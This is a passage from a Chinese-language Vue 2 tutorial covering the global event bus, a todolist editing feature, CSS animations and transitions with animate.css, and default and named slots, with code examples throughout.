}}</h3>\n    <h3>年龄：{{ age }}</h3>\n    <button @click.stop="changeinfo">修改school组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  data() {\n    return {\n      info: "student这里还未被修改",\n      name: "张三",\n      age: 18,\n    };\n  },\n  mounted() {\n    // 给$bus绑定一个自定义事件changestudentevent，将回调函数updateinfo留在了student组件本地\n    this.$bus.$on("changestudentevent", this.updateinfo);\n  },\n  beforedestroy(){\n    // 在本组件销毁前解绑之前绑定的自定义事件，否则当前组件销毁了，该事件一直存在\n    this.$bus.$off("changestudentevent");\n  },\n  methods: {\n    updateinfo(info) {\n      this.info = info;\n    },\n    changeinfo() {\n      // 触发$bus上的changeschoolevent事件，用以student对school的通信\n      this.$bus.$emit(\n        "changeschoolevent",\n        "由student组件修改了school组件的展示信息"\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 全局事件总线是一种组件间通信的方式，适用于任意组件间的通信。\n 2. 安装全局事件总线，在new vue()时，使用beforecreate生命钩子，在里面写上vue.prototype.$bus = this。\n 3. 使用全局事件总线：\n    1. 接收数据（绑定事件）：a组件想要接收数据，则在a组件中给$bus绑定自定义事件，事件的回调函数留在a组件自身。this.$bus.$on(事件名, 回调函数)\n    2. 提供数据（触发事件）：在其他组件使用this.$bus.$emit(事件名, 数据)进行传递数据。\n 4. 最好在当前组件的beforedestroy生命钩子中，用$off去解绑当前组件之前绑定的自定义事件。\n\n----------------------------------------\n\n\n# 5.6 todolist使用全局事件总线\n\n在5.4 todolist使用自定义事件这节里我们留下了孙组件这条线没有修改，我们可以让孙组件todoitem与祖父组件app之间使用全局事件总线。当然，其他组件之间也是可以使用全局事件总线的，但是没有必要。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 将`:addtodo="addtodo"`改为自定义事件 --\x3e\n    <addtodo @addtodoevent="addtodo"></addtodo>\n    \x3c!-- 涉及到孙组件就不改动了 --\x3e\n    <todomain :todos="todos"></todomain>\n    \x3c!-- 将`:checkalltodo="checkalltodo"`和`:clearalltodo="clearalltodo"`改为自定义事件 --\x3e\n    <totaltodo\n      :todos="todos"\n      @checkallevent="checkalltodo"\n      @clearallevent="clearalltodo"\n    ></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  mounted() {\n    // 在全局事件总线上注册自定义事件，方便孙组件todoitem进行触发事件，回调函数留在本组件\n    this.$bus.$on("checktodoevent", this.checktodo);\n    this.$bus.$on("deletetodoevent", this.deletetodo);\n  },\n  beforedestroy() {\n    // 绑定在全局事件总线上的自定义事件，记得在本组件销毁前要解绑自定义事件\n    this.$bus.$off("checktodoevent");\n    this.$bus.$off("deletetodoevent");\n  },\n  data() {\n    return {\n      todos: json.parse(localstorage.getitem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonstr = json.stringify(value);\n        localstorage.setitem("todos", jsonstr);\n      },\n    },\n  },\n  methods: {\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    // 提供给孙组件todoitem来触发的自定义事件的回调函数checktodo\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 提供给孙组件todoitem来触发的自定义事件的回调函数deletetodo\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkalltodo(done) {\n      this.todos.foreach((item) => (item.done = done));\n    },\n    clearalltodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\ntodoitem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoitem.done"\n        @change="handlecheck(todoitem.id)"\n      />\n      <span>{{ todoitem.title }}</span>\n    </label>\n    <button class="btn btn-danger" @click="handledelete(todoitem.id)">\n      删除\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n  props: ["todoitem"],\n  methods: {\n    handlecheck(id) {\n      if (!id) return;\n      // 触发祖父组件app绑定在全局事件总线上的自定义事件checktodoevent，并传递数据给父组件\n      this.$bus.$emit("checktodoevent", id);\n    },\n    handledelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n      // 触发祖父组件app绑定在全局事件总线上的自定义事件checktodoevent，并传递数据给父组件\n        this.$bus.$emit("deletetodoevent", id);\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 5.7 给todolist追加编辑功能\n\n这一节要给已有的todolist追加编辑功能，让每一项可以进行单独的编辑，实现该功能有这些注意点：\n\n * 每一项的删除按钮旁要新增一个编辑按钮，还要加上一个输入框，在编辑状态下隐藏“编辑按钮”，并让输入框覆盖原来的文本。\n * 给todoitem组件新增一个data数据，名为isedit。\n * 按下编辑按钮修改isedit；输入完失去焦点也得修改isedit，输入完得修改todos数据，得使用全局事件总线。\n * 按下编辑按钮得让输入框立即获得焦点，但是修改isedit不会立马让页面更新，原因是浏览器要等修改数据这一轮task执行完，才能去执行更新页面这一轮task，那么focus必须得延迟到“更新页面这一轮task*”之后再执行。vue给我们提供了$nexttick(callback)，让callback在下一次更新完之后调用（下一轮task执行完之后调用callback）。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    <addtodo @addtodoevent="addtodo"></addtodo>\n    <todomain :todos="todos"></todomain>\n    <totaltodo\n      :todos="todos"\n      @checkallevent="checkalltodo"\n      @clearallevent="clearalltodo"\n    ></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  mounted() {\n    this.$bus.$on("checktodoevent", this.checktodo);\n    this.$bus.$on("deletetodoevent", this.deletetodo);\n    // 编辑后更新title\n    this.$bus.$on("updatetodoevent", this.updatetodo);\n  },\n  beforedestroy() {\n    this.$bus.$off("checktodoevent");\n    this.$bus.$off("deletetodoevent");\n    this.$bus.$off("updatetodoevent");\n  },\n  data() {\n    return {\n      todos: json.parse(localstorage.getitem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonstr = json.stringify(value);\n        localstorage.setitem("todos", jsonstr);\n      },\n    },\n  },\n  methods: {\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkalltodo(done) {\n      this.todos.foreach((item) => (item.done = done));\n    },\n    clearalltodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n    // 编辑后更新title\n    updatetodo(id, title) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.title = title;\n          break;\n        }\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\ntodoitem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoitem.done"\n        @change="handlecheck(todoitem.id)"\n      />\n      <span v-show="!isedit">{{ todoitem.title }}</span>\n      <input\n        type="text"\n        v-show="isedit"\n        :value="todoitem.title"\n        ref="inputtodo"\n        @blur="inputblur(todoitem.id, $event)"\n      />\n    </label>\n    <button class="btn btn-danger" @click="handledelete(todoitem.id)">\n      删除\n    </button>\n    <button class="btn btn-edit" @click="handleedit" v-show="!isedit">\n      编辑\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n  props: ["todoitem"],\n  data() {\n    return {\n      isedit: false,\n    };\n  },\n  methods: {\n    handlecheck(id) {\n      if (!id) return;\n      this.$bus.$emit("checktodoevent", id);\n    },\n    handledelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n        this.$bus.$emit("deletetodoevent", id);\n      }\n    },\n    // 处理编辑操作\n    handleedit() {\n      // 这一轮走完都是只是修改了data数据，下一轮才是更新页面\n      this.isedit = true;\n      // 如果不使用$nexttick，这一轮的input还未展示到页面，所以必须等到下一轮页面更新完，再让input获得焦点\n      this.$nexttick(() => {\n        this.$refs.inputtodo.focus();\n      });\n    },\n    // 失去焦点\n    inputblur(id, e) {\n      if (!id) return;\n      this.isedit = false;\n      // 更新todos里的title\n      this.$bus.$emit("updatetodoevent", id, e.target.value);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 六、vue中的动画与过渡\n\n\n# 6.1 动画\n\n回顾一下css中原生的动画，animation: duration timing-function delay iteration-count direction fill-mode play-state name：\n\n * duration：动画总时间\n * timing-function：动效方式\n * delay：延时触发时间\n * iteration-count：播放次数，可以带小数位\n * direction：播放方向，其值normal正向播放，reverse方向播放，alternate正向交替播放，alternate-reverse方向交替播放。\n * fill-mode：确定开始前或结束后是什么样式，其值none默认样式，forwards采用遇到的最后的一个关键帧，backwards采用遇到的第一个关键帧，both同时应用forwards和backwards。\n * play-state：动画是运行或暂停，running和paused。\n * name：@keyframes动画名字。\n\n我们使用animation搭配:class来实现动画的切换（就是修改classname），代码如下\n\n<template>\n  <div>\n    <button @click="switchdisplay">显示/隐藏</button>\n    <h2 :class="displaynow">你好啊啊啊啊啊</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "animationtest",\n  data() {\n    return { displaynow: "display-enter" };\n  },\n  methods: {\n    switchdisplay() {\n      this.displaynow =\n        this.displaynow === "display-leave" ? "display-enter" : "display-leave";\n    },\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 进入时的class */\n.display-enter {\n  animation: 3s ease 0.2s 1 normal both running anienter;\n}\n/* 出去时的class，注意切换动画不要用reverse，最好新建单独的离开@keyframes动画 */\n.display-leave {\n  animation: 3s ease 0.2s 1 normal both running anileave;\n}\n@keyframes anienter {\n  from {\n    transform: translatex(-100%);\n  }\n  to {\n    transform: translatex(0);\n  }\n}\n@keyframes anileave {\n  from {\n    transform: translatex(0);\n  }\n  to {\n    transform: translatex(-100%);\n  }\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n上面这种方式在没有遇到v-show或v-if之前还是挺好用的，一旦遇到v-show或v-if，上面这种方式就无法奏效了。因为在元素被移除或者display:none，动画不会被执行。其实vue给我们封装好了过渡和动画，只需要我们使用简单的css样式搭配类名就可以使用了。\n\n\n\n<trnsition>标签用于包裹一个想要执行动画的元素或组件：\n\n * transition只是一个标签，不占位置不会形成一个真正的元素，这个同template一样。\n * transition标签可用name属性区分是哪个组件用什么动画样式，不至于混淆。\n   * 如果没有name属性，那css中关联的动画样式类名就是默认的.v-enter-active和.v-leave-active。\n   * 如果有name属性，比如name属性值是hello，那css中关联的动画样式名就.hello-enter-active和.hello-leave-active。\n * .v-enter-active {animation:xxx}是进入时执行动画的样式，.v-leave-active {animation:xxx}是离开时执行动画的样式。\n * 如果想在初始化就进行动画的执行，可以在transition标签里加上:appear="true"\n\n<template>\n  <div>\n    <button @click="displaynow = !displaynow">显示/隐藏</button>\n    \x3c!-- vue提供的transition，能让v-if和v-show加上animation动画 --\x3e\n    <transition name="hello" :appear="true">\n      <h2 v-if="displaynow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "animationtest",\n  data() {\n    return { displaynow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 如果transition标签没有name属性，那它默认是.v-enter-active，如果有name那就是.name值-enter-active */\n.hello-enter-active {\n  animation: 3s ease 0.2s 1 normal both running anienter;\n}\n/* 如果transition标签没有name属性，那它默认是.v-leave-active，如果有name那就是.name值-leave-active */\n.hello-leave-active {\n  animation: 3s ease 0.2s 1 normal both running anileave;\n}\n@keyframes anienter {\n  from {\n    transform: translatex(-100%);\n  }\n  to {\n    transform: translatex(0);\n  }\n}\n@keyframes anileave {\n  from {\n    transform: translatex(0);\n  }\n  to {\n    transform: translatex(-100%);\n  }\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 6.2 过渡\n\n因为animation有@keyframes，可以在@keyframes里决定开始和结束的状态，那么动画的类名也只涉及到.v-enter-active和.v-leave-active。而这个transition没有@keyframes，那就需要单独定义开始和结束的状态。\n\ntransition的类名除了需要.v-enter-active和.v-leave-active以外（甚至一些情况下不需要这两个类名，直接将过渡信息写在元素本身上），还需要v-enter、v-enter-to、v-leave-to、v-leave-to，分别表示“进入过程的开始状态”、“进入过程的结束状态”、“离开过程的开始状态”“离开过程的结束状态”。\n\n<template>\n  <div>\n    <button @click="displaynow = !displaynow">显示/隐藏</button>\n    \x3c!-- vue提供的transition，能让v-if和v-show加上animation动画 --\x3e\n    <transition name="hello" :appear="true">\n      <h2 v-show="displaynow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "animationtest",\n  data() {\n    return { displaynow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 过渡信息写在这两个类名里，甚至可以直接放到h2元素里 */\n.hello-enter-active,\n.hello-leave-active {\n  transition: 3s ease;\n}\n/* 进入过程的开始状态就是-100%，并且离开过程的结束状态也是-100% */\n.hello-enter,\n.hello-leave-to {\n  transform: translatex(-100%);\n}\n/* 进入过程的结束状态就是0，并且离开过程的开始状态也是0 */\n.hello-enter-to,\n.hello-leave {\n  transform: translatex(0);\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 6.3 多元素动画/过渡\n\n多个元素进行动画/过渡，可以使用v-if控制只显示一个，也可以使用单独的容器将多个元素进行包裹再使用<transition>标签。还有一种是使用<transition-group>。注意：同名元素or组件，得使用key来区分彼此。\n\nv-if方式：\n\n<template>\n  <transition>\n    <button v-if="isediting" key="save">\n      save\n    </button>\n    <button v-else key="edit">\n      edit\n    </button>\n  </transition>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n<transition-group>方式：\n\n<template>\n  <div>\n    <button @click="displaynow = !displaynow">显示/隐藏</button>\n    \x3c!-- 简单修改了上一节的模板即可 --\x3e\n    <transition-group name="hello" :appear="true">\n      \x3c!-- 使用key来区分 --\x3e\n      <h2 v-show="displaynow" key="1">你好啊啊啊啊啊</h2>\n      <h2 v-show="!displaynow" key="2">我不好啊啊啊啊</h2>\n    </transition-group>\n  </div>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 6.4 集成第三方动画库\n\n推荐[animate.css](https://animate.style/)， 使用npm i animate.css进行安装，安装之后引入到项目里import "animate.css"`。\n\n然后选择一个要使用动画的<transition>或<transition-group>，在标签里添加name="animate__animated animate__bounce"，如果不是vue项目，这个name换成class。\n\n再就是使用vue给我们提供的6个自定义过渡的类名，是专门用来配合第三方动画库来使用的。这6个和6.2 过渡这节里的类名极其相似，只是将v-换成class放到了末尾。\n\n * enter-active-class：进入过程的动效\n * leave-active-class：离开过程的动效\n * enter-class：进入过程的开始状态\n * enter-to-class：进入过程的结束状态\n * leave-class：离开过程的开始状态\n * leave-to-class：离开过程的结束状态\n\n<template>\n  <div>\n    <button @click="displaynow = !displaynow">显示/隐藏</button>\n    \x3c!-- 引入第三方动画库 --\x3e\n    <transition\n      :appear="true"\n      name="animate__animated animate__bounce"\n      enter-active-class="animate__backindown"\n      leave-active-class="animate__backoutright"\n    >\n      <h2 v-show="displaynow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nimport "animate.css";\nexport default {\n  name: "animationtest",\n  data() {\n    return { displaynow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n我们给todolist案例加上第三方动画库，在新增和删除时，让每一项的进入和离开都具有动画。\n\n<template>\n  <ul class="todo-main">\n    \x3c!-- 要记得引入import "animate.css"，每一项本就有key了   --\x3e\n    <transition-group\n      name="animate__animated animate__bounce"\n      enter-active-class="animate__backinright"\n      leave-active-class="animate__backoutleft"\n    >\n      <todoitem\n        v-for="todo in todos"\n        :key="todo.id"\n        :todoitem="todo"\n      ></todoitem>\n    </transition-group>\n  </ul>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. vue给我们封装好了过渡与动画，因为原生的css过渡和动画你不好掌握在vue项目中什么情况下能使用。\n 2. 在插入、更新和移除dom元素时，在合适的时候给元素加样式类名。\n 3. 准备好样式：\n    1. 元素进入时的样式：\n       * v-enter：进入的起点（进入过程的开始状态）\n       * v-enter-to：进入的终点（进入过程的结束状态）\n       * v-enter-active：进入中（进入过程中使用动效animation或transition）\n    2. 元素离开时的样式：\n       * v-leave：离开的起点（离开过程的开始状态）\n       * v-leave-to：离开的终点（离开过程的结束状态）\n       * v-leave-active：离开中（离开过程中使用动效animation或transition）\n 4. 使用<transition>包裹需要过渡/动画的元素，并配置name属性。\n 5. 若多个元素需要过渡/动画，则需要使用<transition-group>，且同名元素要指定一个key="xxx"。\n\n----------------------------------------\n\n\n# 七、内容分发——插槽\n\n\n# 7.1 默认插槽\n\n复用组件时，我们可能需要使用相同的数据来呈现不同的页面展示形式，你可能会使用type搭配v-if、v-else-if和v-else来实现，例如下面这个例子：\n\napp4.vue：\n\n<template>\n  <div class="outer">\n    \x3c!-- listdata数据相同，传入不同的type来展示不同形状的的页面结构 --\x3e\n    <category title="美食" :listdata="foods" :type="1"></category>\n    <category title="美食" :listdata="foods" :type="2"></category>\n    <category title="美食" :listdata="foods" :type="3"></category>\n  </div>\n</template>\n\n<script>\nimport category from "./components/category.vue";\nexport default {\n  name: "app4",\n  components: { category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\ncategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- type搭配v-if、v-else-if和v-else来决定展示什么样的自定义内容 --\x3e\n    <ul v-if="type === 1">\n      <li v-for="(item, index) in listdata" :key="index">{{ item }}</li>\n    </ul>\n    <ol v-else-if="type === 2">\n      <li v-for="(item, index) in listdata" :key="index">{{ item }}</li>\n    </ol>\n    <div v-else>\n      <h4 v-for="(item, index) in listdata" :key="index">{{ item }}</h4>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "category",\n  props: ["title", "listdata", "type"],\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n我们可以使用默认插槽来优化修改上面的代码。插槽的作用就是将父组件传来的自定义内容（自定义结构）插入到子组件的<slot>里（内容分发）。“自定义内容”，可以有普通文本，也可以有自己编写的散乱的模板代码，也可以有<template>包裹的模板代码，也可以有自定义组件。\n\n\x3c!-- 在子组件调用标签里（不是子组件定义处），写上自定义内容，\n最后内容会被分发到子组件内部（子组件定义处）里面的插槽处（插到插槽里） --\x3e\n<navigation-link>\n  \x3c!-- 自定义内容开始 --\x3e\n  \x3c!-- span元素和“hello”形成的是散乱的模板代码 --\x3e\n  <span class="fa">{{name，}}</span>\n  hello\n  \x3c!-- 自定义内容结束 --\x3e\n</navigation-link>\n<navigation-link>\n  \x3c!-- 自定义内容开始 --\x3e\n  \x3c!-- 自定义组件font-awesome-icon，它也会被分发到navigation-link组件内部 --\x3e\n  <font-awesome-icon name="user"></font-awesome-icon>\n  hello\n  \x3c!-- 自定义内容结束 --\x3e\n</navigation-link>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n修改开头的例子：\n\n * 先将子组件内部的type和v-if适配代码全部去掉，然后使用插槽<slot></slot>来占住之前适配代码所在位置，最后就等待父组件传来自定义内容的插入。相当于在子组件内部挖了一个坑，等着父组件根据不同的情况将自定义内容传过来填坑。\n * 处理好子组件内部后，在父组件这边，需要将自定义内容（自定义结构），放到父组件里的子组件调用标签内。具体是先将<todolist/>打开成<todolist>和</todolist>，再把自定义内容放入<todolist>和</todolist>之间。\n\n以上两步过后，vue在解析父组件模板时，也会将<todolist>和</todolist>之间的自定义结构进行解析；到了子组件模板开始解析时，会把刚刚解析好的内容放到<slot></slot>。这就是使用不同的自定义内容，展示到子组件里，也叫做内容分发。上面例子经过插槽优化修改后的代码如下：\n\napp4.vue：\n\n<template>\n  <div class="outer">\n    <category title="美食">\n      \x3c!--将不同的自定义结构（ul-li）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <ul>\n        <li v-for="(item, index) in foods" :key="index">{{ item }}</li>\n      </ul>\n    </category>\n    <category title="美食">\n      \x3c!--将不同的自定义结构（ol-li）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <ol>\n        <li v-for="(item, index) in foods" :key="index">{{ item }}</li>\n      </ol>\n    </category>\n    <category title="美食">\n      \x3c!--将不同的自定义结构（ul-h4）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <div>\n        <h4 v-for="(item, index) in foods" :key="index">{{ item }}</h4>\n      </div>\n    </category>\n  </div>\n</template>\n\n<script>\nimport category from "./components/category.vue";\nexport default {\n  name: "app4",\n  components: { category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\ncategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 承接父组件传来的自定义内容。它属于默认插槽，也就是没有name --\x3e\n    <slot>我是插槽的后备内容，如果有自定义内容传过来，此处就会被它替代</slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "category",\n  props: ["title"],\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n看完上面例子，是父组件将不同的自定义结构传递给了子组件，只是不是通过以往的props传参方式，而是通过在子组件设置插槽的方式进行插入自定义结构的。只要区分一个是传值，一个是传自定义结构（非值，一般是模板代码或者组件）。\n\n还有两个注意点：\n\n * 如果没有在子组件里使用slot标签，也就是没有设置插槽地点，父组件的自定义内容就会被抛弃。\n * 如果在子组件里使用了slot标签，但是没有在父组件自定义内容，那么slot标签体的内容会显示在子组件里，它是一个后备内容（与函数的形参默认值类似）。\n\n\n# 7.2 具名插槽\n\n默认插槽没有带name属性（其实默认带了，即name="default"），一般都默认将自定义html内容插入到这个默认插槽里。其实是可以使用多个插槽的，需要在<slot>里使用name="xxx"属性进行区分（定义插槽名），这种插槽叫做具名插槽。具名插槽主要是为了在子组件内部使用多个插槽，将不同的内容分发到子组件内不同的位置。\n\n在子组件里的插槽使用name="xxx"进行区分，而在父组件的自定义内容这边：\n\n 1. 如果自定义内容没有使用<template>进行包裹也不是自定义组件（普通元素），那就使用slot="xxx"加到普通元素上，xxx是插槽名。\n 2. 如果自定义内容使用了<template>进行包裹，或者是一个组件定组件，那就使用v-slot:xxx加到<template>标签或者自定义组件标签里，xxx是插槽名。\n 3. 注意，v-slot只能添加在<template>或者自定义组件标签里，不能用在普通的元素上。\n 4. v-slot:xxx，是可以进行缩写的，即v-slot:xxx缩写为#xxx，这个xxx是插槽名。\n 5. 那默认插槽呢？你都没名字，再用slot="xxx"或v-slot:xxx就没有意义了。如果你非要加slot="default"或v-slot:default或#default，就可以加到子组件调用标签里（子组件也是组件，所以可用v-slot）。就不是加到自定义内容本身了，这容易引起歧义，最好不要这么做！！！\n\napp4.vue：\n\n<template>\n  <div class="outer">\n    \x3c!-- 这里还可以是#default，其实没什么必要加。因为category内部自定义内容如果不\n    加slot="xxx"或#xxx，就表示category内部整个自定义内容都插入到默认插槽了 --\x3e\n    <category title="美食" slot="default">\n      \x3c!-- 普通元素就加slot="xxx"，比如这里可以是slot="content" --\x3e\n      <img\n        src="https://t7.baidu.com/it/u=760837404,2640971403&fm=193&f=gif"\n      />\n      \x3c!-- 普通元素就加slot="xxx"，比如这里可以是slot="footer" --\x3e\n      <a href="http://">更多美食</a>\n    </category>\n\n    <category title="游戏">\n      \x3c!-- 使用了模板标签，那就用v-slot: content，还可缩写为#content。将它插入到名为content的插槽里 --\x3e\n      <template #content>\n        <ul>\n          <li v-for="(item, index) in games" :key="index">{{ item }}</li>\n        </ul>\n        <div class="foot">\n          <a href="http://">单机游戏</a>\n          <a href="http://">网络游戏</a>\n        </div>\n      </template>\n    </category>\n\n    <category title="电影">\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="content"。将它插入到名为content的插槽里 --\x3e\n      <video\n        slot="content"\n        controls\n        src="http://pgc.qcdn.xiaodutv.com/1491690018_136852136_2021022300080220210223005108.mp4"\n      ></video>\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="foot"。将它插入到名为foot的插槽里 --\x3e\n      <div class="foot" slot="footer">\n        <a href="http://">经典</a>\n        <a href="http://">热门</a>\n        <a href="http://">推荐</a>\n      </div>\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="foot"。将它插入到名为foot的插槽里 --\x3e\n      \x3c!-- 可以将多个内容放到同一个插槽里，不会被覆盖，只会进行追加。追加到footer插槽里了。 --\x3e\n      <h4 slot="footer">欢迎来到影院</h4>\n    